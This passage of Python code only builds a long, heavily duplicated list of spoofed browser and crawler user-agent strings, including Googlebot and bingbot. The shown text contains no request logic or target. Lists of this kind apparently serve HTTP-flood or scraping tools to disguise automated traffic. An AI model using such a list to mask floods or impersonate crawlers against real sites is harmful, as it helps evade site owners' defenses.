	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
